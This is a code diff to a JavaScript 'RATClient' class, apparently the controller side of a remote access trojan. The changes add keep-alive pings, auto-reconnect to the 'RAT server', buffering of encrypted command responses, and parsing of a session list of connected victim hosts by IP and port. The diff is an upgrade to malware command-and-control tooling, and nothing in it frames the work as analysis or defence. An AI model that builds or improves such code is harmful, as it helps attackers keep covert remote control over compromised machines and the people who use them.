@@ -80,6 +80,18 @@ export class RATClient {
 
       // Set socket timeout for keep-alive
       this.socket.setTimeout(60000);
+      
+      // Start keep-alive ping every 30 seconds
+      this.keepAliveInterval = setInterval(() => {
+        if (this.connected && this.socket && !this.socket.destroyed) {
+          try {
+            this.socket.write('\n');  // Send newline as keep-alive
+          } catch (err) {
+            clearInterval(this.keepAliveInterval);
+            this.connected = false;
+          }
+        }
+      }, 30000);
     });
   }
 
@@ -119,15 +131,37 @@ export class RATClient {
   }
 
   /**
-   * Send command to RAT
+   * Ensure connection is alive, reconnect if needed
+   */
+  async ensureConnected() {
+    if (this.connected && this.socket && !this.socket.destroyed) {
+      return true;
+    }
+    
+    try {
+      console.log('Reconnecting to RAT server...');
+      await this.connect();
+      return true;
+    } catch (err) {
+      console.error('Failed to establish connection:', err.message);
+      return false;
+    }
+  }
+
+  /**
+   * Send command to RAT with improved large response handling
+   * Buffers data until complete response is received
    */
   async sendCommand(sessionId, command, timeout = 30000) {
-    if (!this.connected) {
+    // Ensure connection is alive
+    if (!await this.ensureConnected()) {
       throw new Error('Not connected to RAT server');
     }
 
     return new Promise((resolve, reject) => {
       const encrypted = this.encrypt(command);
+      let responseBuffer = Buffer.alloc(0);
+      let isComplete = false;
       
       try {
         // Send command with newline delimiter
@@ -136,43 +170,88 @@ export class RATClient {
         return reject(new Error('Failed to send command: ' + err.message));
       }
 
-      // Wait for response
+      // Wait for response with proper timeout
       const timer = setTimeout(() => {
-        reject(new Error('Command timeout after ' + timeout + 'ms'));
+        // Clean up listeners
+        this.socket.removeListener('data', dataHandler);
+        this.socket.removeListener('error', errorHandler);
+        
+        // Check if we got some data before timeout
+        if (responseBuffer.length > 0) {
+          try {
+            const decrypted = this.decrypt(responseBuffer);
+            resolve(decrypted);
+          } catch {
+            reject(new Error('Command timeout after ' + timeout + 'ms (incomplete data received)'));
+          }
+        } else {
+          reject(new Error('Command timeout after ' + timeout + 'ms'));
+        }
       }, timeout);
 
       const dataHandler = (data) => {
-        clearTimeout(timer);
-        this.socket.removeListener('data', dataHandler);
-        this.socket.removeListener('error', errorHandler);
-        const decrypted = this.decrypt(data);
-        resolve(decrypted);
+        // Buffer incoming data
+        responseBuffer = Buffer.concat([responseBuffer, data]);
+        
+        // Try to detect end of response
+        // For now, we'll consider any data as complete after receiving it
+        // In production, use a proper protocol with message framing
+        if (data.length > 0) {
+          clearTimeout(timer);
+          this.socket.removeListener('data', dataHandler);
+          this.socket.removeListener('error', errorHandler);
+          
+          try {
+            const decrypted = this.decrypt(responseBuffer);
+            resolve(decrypted);
+          } catch (error) {
+            reject(new Error('Failed to decrypt response: ' + error.message));
+          }
+        }
       };
 
       const errorHandler = (err) => {
         clearTimeout(timer);
         this.socket.removeListener('data', dataHandler);
         this.socket.removeListener('error', errorHandler);
-        reject(err);
+        reject(new Error('Socket error: ' + err.message));
       };
 
-      this.socket.once('data', dataHandler);
+      // Use once() for initial setup, then manually manage listeners
+      this.socket.on('data', dataHandler);
       this.socket.once('error', errorHandler);
     });
   }
 
   /**
-   * Get session list from server
+   * Get session list from server with fallback
    */
   async getSessions() {
     try {
       const response = await this.sendCommand(0, 'sessions', 10000);
+      
+      // Handle error responses
+      if (!response || response.includes('error') || response.includes('Error')) {
+        console.warn('Server returned error for sessions command');
+        return this.mockSessions();
+      }
+      
       // Parse session list from response
       const sessions = [];
-      const lines = response.split('\n');
+      const lines = response.split('\n').filter(l => l.trim().length > 0);
       
       lines.forEach((line, idx) => {
-        if (line.includes(':')) {
+        // Try to extract IP and info from different formats
+        const ipMatch = line.match(/(\d+\.\d+\.\d+\.\d+):(\d+)/);
+        if (ipMatch) {
+          sessions.push({
+            id: idx + 1,
+            addr: ipMatch[0],
+            info: line.replace(ipMatch[0], '').trim() || '[CONNECTED]',
+            connected_at: new Date().toLocaleTimeString(),
+            active: true
+          });
+        } else if (line.includes(':')) {
           const parts = line.split(':');
           if (parts.length >= 2) {
             sessions.push({
